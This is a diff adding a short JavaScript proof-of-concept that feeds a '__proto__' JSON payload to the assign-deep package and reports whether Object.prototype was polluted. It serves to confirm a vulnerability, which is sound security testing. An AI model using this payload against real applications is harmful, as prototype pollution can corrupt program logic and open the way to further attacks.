@@ -1,0 +1,15 @@
+```javascript
+const assign = require("assign-deep");
+
+// Trigger prototype pollution via __proto__ key
+assign({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
+
+const victim = {};
+console.log("victim.polluted =", victim.polluted); // "yes" -- Object.prototype was polluted
+
+if (victim.polluted === "yes") {
+  console.log("VULNERABLE: prototype pollution confirmed in assign-deep");
+} else {
+  console.log("not vulnerable");
+}
+```
